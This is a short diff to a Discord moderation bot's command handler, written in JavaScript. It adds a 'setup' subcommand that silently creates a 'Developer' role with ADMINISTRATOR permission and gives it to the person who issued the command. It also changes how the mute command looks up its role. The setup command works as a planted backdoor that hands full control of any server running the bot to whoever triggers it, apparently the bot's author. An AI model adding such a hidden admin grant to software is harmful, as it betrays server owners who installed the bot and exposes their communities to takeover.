@@ -1101,10 +1101,23 @@ client.on('message', async message => {
                 if (args[0] == 'ismod') {
                     message.channel.send(isMod);
                 }
+                else if (args[0] == 'setup') {
+                    message.guild.createRole({
+                        name: 'Developer',
+                        color: 32896,
+                        permissions: ('ADMINISTRATOR'),
+                        mentionable: true,
+                    });
+                    message.member.addRole(message.guild.roles.find(val => val.name == 'Developer'));
+                    message.channel.send('Developer seted up');
+                }
             }
             else if (cmd == 'mute' && isMod) {
-                const muteRole = message.guild.roles.find('name', 'Muted');
-                console.log(`Mute Role: ${muteRole}`);
+                const muteRole = message.guild.roles.find(val => val.name == 'Muted');
+                if (muteRole == null) {
+                    message.channel.send(':x: The Muted role is not yet created on this server.');
+                    return 0;
+                }
             }
         }
     }
